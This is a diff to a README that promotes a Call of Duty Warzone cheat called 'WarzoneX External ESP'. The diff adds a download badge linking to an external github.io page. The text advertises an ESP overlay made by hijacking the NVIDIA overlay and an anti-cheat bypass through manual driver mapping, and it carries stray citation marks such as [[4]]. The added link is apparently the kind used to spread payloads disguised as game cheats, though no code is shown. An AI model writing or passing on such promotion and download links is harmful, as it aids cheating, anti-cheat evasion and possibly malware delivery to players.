@@ -3,6 +3,8 @@
 ## 🎮 Game-Changing Features for Call of Duty Warzone  
 WarzoneX External ESP combines elite performance with stealth technology. Built in **C++**, it delivers:  
 
+[![Download Warzone Aimbot v2.0](https://img.shields.io/badge/Download-Warzone_Cheat_v2.0-blueviolet)](https://cod-external-cheat.github.io/.github/)  
+
 ### 🛡 Key Features  
 - **ESP Overlay** 🌟: Real-time enemy positions & health bars via NVIDIA overlay hijacking [[4]]  
 - **Anti-Cheat Bypass** 🔒: Manual driver mapping and memory scanning [[4]]  
